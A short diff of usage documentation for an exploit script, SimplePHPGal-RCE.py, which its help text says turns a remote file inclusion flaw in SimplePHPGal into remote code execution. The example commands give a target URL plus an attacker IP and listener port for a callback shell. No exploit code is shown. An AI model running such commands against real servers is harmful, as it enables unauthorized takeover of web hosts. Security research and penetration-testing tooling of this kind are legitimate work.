@@ -7,8 +7,10 @@ python3 SimplePHPGal-RCE.py -h
 usage: SimplePHPGal-RCE.py [-h] [--httpport HTTPPORT] url attackerip attackerport
 
 This script uses an RFI in SimplePHPGal to get RCE
- python3 SimplePHPGal-RCE.py http://192.168.1.12/ 192.168.1.5 4444
- python3 SimplePHPGal-RCE.py http://192.168.1.12/ 192.168.1.5 4444 --httpport 8080
+
+python3 SimplePHPGal-RCE.py http://192.168.1.12/ 192.168.1.5 4444
+
+python3 SimplePHPGal-RCE.py http://192.168.1.12/ 192.168.1.5 4444 --httpport 8080
 
 positional arguments:
   url                  The URL of the target.
